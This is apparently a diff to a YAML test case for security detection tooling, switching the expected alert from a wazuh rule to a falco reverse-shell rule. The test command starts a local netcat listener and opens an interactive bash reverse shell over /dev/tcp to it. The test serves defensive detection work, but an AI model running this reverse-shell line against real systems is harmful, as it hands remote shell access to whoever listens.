@@ -6,5 +6,5 @@ command: |
   (timeout 5 nc -l -p 9999 >/dev/null 2>&1 &) ; sleep 1 ;
   timeout 3 bash -c 'bash -i >& /dev/tcp/127.0.0.1/9999 0>&1' || true
 expect:
-  engine: wazuh
-  rule_id: "100210"
+  engine: falco
+  rule: DLL Reverse Shell
